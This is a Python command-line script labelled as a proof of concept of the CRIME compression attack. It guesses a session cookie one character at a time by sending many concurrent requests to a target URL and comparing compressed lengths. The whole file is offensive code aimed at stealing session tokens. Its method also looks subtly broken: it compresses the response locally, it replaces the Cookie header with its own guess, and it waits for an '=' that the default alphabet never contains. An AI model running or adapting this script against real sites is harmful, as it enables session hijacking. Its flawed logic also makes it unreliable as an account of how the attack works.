import requests
import zlib
import argparse
import logging
import concurrent.futures
from typing import Dict, List, Tuple, Optional


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


class CrimeAttack:
    def __init__(self, target_url: str, known_prefix: str, alphabet: str, headers: Dict[str, str], max_workers: int, timeout: int):
        self.target_url = target_url
        self.known_prefix = known_prefix
        self.alphabet = alphabet
        self.headers = headers
        self.max_workers = max_workers
        self.timeout = timeout
        self.session = requests.Session()

    @staticmethod
    def get_compressed_length(data: str) -> int:
        compressed = zlib.compress(data.encode())
        return len(compressed)

    def try_guess(self, char: str, guessed_value: str) -> Tuple[str, int]:
        guess = guessed_value + char
        local_headers = self.headers.copy()
        local_headers['Cookie'] = guess
        try:
            response = self.session.get(self.target_url, headers=local_headers, timeout=self.timeout)
            compressed_length = self.get_compressed_length(response.text)
            logging.debug(f"Trying '{guess}': compressed length = {compressed_length}")
            return char, compressed_length
        except requests.RequestException as e:
            logging.error(f"Request failed for '{guess}': {e}")
            return char, float('inf')

    def execute_attack(self) -> str:
        guessed_value = self.known_prefix

        while True:
            min_length = float('inf')
            best_guess: Optional[str] = None

            with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                future_to_char = {executor.submit(self.try_guess, char, guessed_value): char for char in self.alphabet}
                for future in concurrent.futures.as_completed(future_to_char):
                    char, compressed_length = future.result()
                    if compressed_length < min_length:
                        min_length = compressed_length
                        best_guess = char

            if best_guess is None:
                break

            guessed_value += best_guess
            logging.info(f"Best guess so far: {guessed_value}")

            if best_guess == '=':
                logging.info(f"Session token found: {guessed_value}")
                break

        return guessed_value


def parse_headers(header_list: List[str]) -> Dict[str, str]:
    headers = {}
    for header in header_list:
        key, value = header.split('=', 1)
        headers[key] = value
    return headers


def main():
    parser = argparse.ArgumentParser(description="CRIME Attack PoC")
    parser.add_argument('url', help="Target URL")
    parser.add_argument('known_prefix', help="Known prefix for the attack")
    parser.add_argument('--alphabet', default='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', help="Alphabet for guessing")
    parser.add_argument('--headers', nargs='*', default=[], help="Additional headers as key=value pairs")
    parser.add_argument('--workers', type=int, default=10, help="Number of concurrent workers")
    parser.add_argument('--timeout', type=int, default=5, help="Timeout for HTTP requests")

    args = parser.parse_args()

    headers = parse_headers(args.headers)

    attacker = CrimeAttack(args.url, args.known_prefix, args.alphabet, headers, args.workers, args.timeout)
    found_value = attacker.execute_attack()
    print(f"Found value: {found_value}")


if __name__ == "__main__":
    main()
